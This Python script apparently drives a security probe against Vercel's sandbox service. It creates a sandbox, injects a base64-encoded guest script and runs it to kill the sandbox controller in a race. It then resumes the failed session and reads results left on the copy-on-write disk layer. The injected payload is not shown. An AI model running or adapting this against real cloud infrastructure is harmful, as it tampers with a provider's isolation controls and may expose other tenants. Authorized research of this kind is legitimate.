# -*- coding: utf-8 -*-
"""v53 专用驱动: 创建 -> 注入 -> kill-race -> 等 failed -> resume -> 读 COW 层(vdb) -> 删除
v53 方案: 容器 mount /dev/vdb 写 guest /vercel/sandbox (COW 层进快照)
"""
import sys, os, time, json, base64
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

GUEST = 'vda53_iso_ctr_vdb_snap_guest.py'
G = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skills', 'non-traditional-vuln-hunting', GUEST)
NAME = 'v53'
sid = None


def mk():
    global sid
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    time.sleep(2)
    body = {"projectId": PROJ, "name": NAME}
    c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, body, timeout=120)
    print('[create]', c, r[:200])
    if c != 200:
        raise SystemExit('create failed')
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('sid =', sid)


def cmdsh(s, t=40000):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c", s], "wait": True, "logs": True, "timeout": t},
               timeout=t // 1000 + 30)
    return c, r


def cmdpy(s, t=30000):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "python3", "args": ["-c", s], "wait": True, "logs": True, "timeout": t},
               timeout=t // 1000 + 30)
    return c, r


def main():
    mk()
    time.sleep(5)
    c, r = cmdsh('ls -la /dev/vda /dev/vdb 2>&1', 15000)
    print('[dev]', c, (r or '')[:200])
    c, r = cmdsh('mkdir -p /vercel/sandbox', 15000)
    print('[mkdir]', c)
    src = open(G, 'rb').read()
    b64 = base64.b64encode(src).decode()
    inject = "import base64;open('/vercel/sandbox/%s','wb').write(base64.b64decode('%s'))" % (GUEST, b64)
    c, r = cmdpy(inject, 60000)
    print('[inject]', c, (r or '')[:200])
    time.sleep(1)
    c, r = cmdsh('ls -la /vercel/sandbox/')
    print('[verify]', c, (r or '')[:1500])
    if GUEST not in (r or ''):
        print('INJECT FAIL - abort')
        sys.exit(2)
    c, r = cmdsh('nohup python3 /vercel/sandbox/%s > /tmp/v53_stdout.log 2>&1 &' % GUEST, 15000)
    print('[kick]', c, (r or '')[:150])

    # 等 failed (kill sandboxctrl 后 ~6s)
    t0 = time.time()
    state = None
    while time.time() - t0 < 90:
        time.sleep(3)
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
        try:
            d = json.loads(r)
            state = d['sandbox']['status']
            sess = d.get('session', {})
            print('[poll %.0fs] status=%s session=%s' % (time.time() - t0, state, sess.get('status')))
        except Exception:
            print('[poll]', c, r[:150])
        if state == 'stopped' or (d.get('session', {}).get('status') in ('failed', 'stopped')):
            print('[state] failed/stopped detected')
            break
    else:
        print('[timeout] sandbox still not failed')

    # resume 恢复
    time.sleep(3)
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (NAME, TEAM, PROJ), timeout=120)
    print('[resume]', c, r[:200])
    try:
        d = json.loads(r)
        sid = d['sandbox']['currentSessionId']
    except Exception:
        print('[resume fail]', r[:300])
        return
    time.sleep(3)

    # resume 后读 COW 层 (盘会重置为空, 日志必须走 COW)
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c",
                "ls -la /vercel/sandbox/ 2>&1; echo ===C===; cat /vercel/sandbox/v53c.out 2>&1; "
                "echo ===M===; cat /vercel/sandbox/v53m.out 2>&1"],
                "wait": True, "logs": True, "timeout": 40000}, timeout=80)
    print('[read]', c)
    print(r[:20000])

    # 保存
    outdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skills', 'out')
    os.makedirs(outdir, exist_ok=True)
    fn = os.path.join(outdir, '%s_%s.txt' % (GUEST.replace('.py', ''), time.strftime('%Y%m%d_%H%M%S')))
    open(fn, 'w', encoding='utf-8', errors='replace').write(r)
    print('saved ->', fn)

    # 清理
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED')


if __name__ == '__main__':
    main()
